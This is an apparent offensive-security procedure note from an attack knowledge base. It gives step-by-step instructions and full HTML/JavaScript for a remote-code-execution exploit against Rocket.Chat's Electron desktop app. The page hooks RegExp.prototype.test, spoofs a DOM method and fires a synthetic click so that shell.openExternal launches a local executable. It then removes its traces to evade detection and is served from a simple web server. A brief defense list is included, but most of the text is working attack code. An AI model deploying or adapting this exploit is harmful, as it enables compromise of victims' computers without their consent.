---
id: proc-malicious-html-regexp-hook
tags:
  - javascript
  - hook
  - bypass
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
  - Electron
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:23:32.835Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Create-Malicious-HTML-for-RegExp-Hook

## Summary

This procedure creates a malicious HTML webpage that hooks the RegExp.prototype.test method to always return true for URL protocol regex checks, spoofs DOM methods, and dispatches synthetic click events to bypass validation in Rocket.Chat's Electron app, enabling the loading of local file URLs via shell.openExternal.

## Description

In the context of exploiting Rocket.Chat's Electron desktop app, this procedure targets the preload/links.js file's URL validation. By overriding RegExp.prototype.test to evade the '^([a-z]+:)?\/\/' protocol check, creating a fake <A> element with a local href (e.g., 'c:\\windows\\system32\\calc.exe'), defining a spoofed document.closest, and dispatching a MouseEvent 'click' on document, the attack triggers event listeners without isTrusted flag validation. This lacks context isolation, allowing preload script manipulation. Prerequisites include a web server to host the page and a victim using the vulnerable app version (e.g., 2.17.9). Expected outcome: When loaded, the page silently executes the bypass, leading to RCE.

## Requirements

1. Web server access (e.g., local or remote HTTP server on port 80).
2. Text editor to write HTML/JS.
3. Knowledge of JavaScript prototype pollution and DOM manipulation.

## Defense

Defensive measures and detection strategies:

- Enable strict context isolation in Electron apps (e.g., --context-isolation flag).
- Validate event.isTrusted in all click handlers for shell.openExternal.
- Use Content Security Policy (CSP) to restrict script execution in preload contexts.
- Monitor for prototype overrides via runtime JS analysis tools.

## Objectives

1. Bypass URL regex checks in links.js to allow local file protocols.
2. Trigger synthetic events to execute shell.openExternal.
3. Prepare for RCE without user interaction beyond page load.

## Instructions

### Step 1: Write the Malicious HTML

**Context**: Create index.html with embedded JavaScript to perform the hook and event dispatch after a short delay to ensure DOM readiness.

No command; use a text editor:

```html
<!DOCTYPE html>
<html>
<head><title>Fake Rocket.Chat Server</title></head>
<body>
<script>
setTimeout(function() {
  // Hook RegExp.test to bypass protocol check
  var originalTest = RegExp.prototype.test;
  RegExp.prototype.test = function() {
    if (this.source === '^([a-z]+:)?\\/\\/') {
      return true; // Always allow local protocols
    }
    return originalTest.apply(this, arguments);
  };

  // Create fake link to local executable
  var link = document.createElement('A');
  link.href = 'c:\\windows\\system32\\calc.exe'; // Adapt for Linux/macOS

  // Spoof closest method to return the link
  document.closest = function() { return link; };

  // Dispatch synthetic click event
  var event = new MouseEvent('click', { bubbles: true });
  document.dispatchEvent(event);

  // Clean up to avoid detection
  RegExp.prototype.test = originalTest;
  delete document.closest;
}, 1000);
</script>
</body>
</html>
```

> This script overrides the test method specifically for the protocol regex, creates the link, spoofs the DOM query, dispatches the event to mimic a trusted click, and restores originals. Expected: No visible output; bypass activates on load.

### Step 2: Host the Page

**Context**: Serve the HTML via HTTP to be loaded by the Electron app.

Use a simple server (e.g., Python 3):

```bash
python -m http.server 80
```

> Place index.html in the server directory. Expected: Page accessible at http://your-ip/index.html.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[JavaScript]] JavaScript

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[JavaScript]]
- [[electron]]
- [[rce]]
